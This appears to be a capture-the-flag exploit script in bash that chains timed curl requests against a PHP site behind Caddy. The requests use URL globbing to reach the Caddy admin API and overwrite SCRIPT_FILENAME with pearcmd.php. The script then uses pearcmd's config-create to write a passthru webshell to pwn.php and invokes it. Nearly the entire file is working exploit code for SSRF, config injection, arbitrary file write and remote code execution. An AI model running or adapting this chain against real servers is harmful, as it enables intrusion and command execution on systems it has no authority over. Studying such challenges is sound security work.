#!/bin/bash

HOST="${1:-http://localhost/}"

# 0s:
# Change SCRIPT_FILENAME to pearcmd @ 5s
# http://{hc.lc,localhost,@discord.com:0}{/api/webhooks/1/a?,/xss.php?xss=lol&delay=5,:2019/config/apps/http/servers/srv0/routes/3/handle/0/transport/env}
curl --data-urlencode 'url=http://{hc.lc,localhost,@discord.com:0}{/api/webhooks/1/a?,/xss.php?xss=lol&delay=5,:2019/config/apps/http/servers/srv0/routes/3/handle/0/transport/env}' \
     --data-urlencode 'message=a","SCRIPT_FILENAME":"/usr/local/lib/php/pearcmd.php' \
     "$HOST" &
sleep 5s

# 5s:
# Revert SCRIPT_FILENAME @ 25s
# we need call this now, so that SCRIPT_FILENAME is restored later, after we overwrote it
curl --data-urlencode 'url=http://{hc.lc,localhost,@discord.com:0}{/api/webhooks/1/b?,/xss.php?xss=lol&delay=20,:2019/config/apps/http/servers/srv0/routes/3/handle/0/transport/env}' \
     --data-urlencode 'message=b' \
     "$HOST" &
sleep 10s

# 15s:
# Invoke pearcmd since SCRIPT_FILENAME is set to /usr/local/lib/pearcmd.php
# we use pearcmd to write our payload to /pwn.php
output=$(curl "${HOST}/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=passthru('/getflag')?>+/var/www/html/pwn.php")
echo "$output"
echo "waiting..."
sleep 30s


# 45s:
# SCRIPT_FILENAME should be reverted by now...
# invoke payload @ /pwn.php
response=$(curl "${HOST}/pwn.php")
echo "$response"

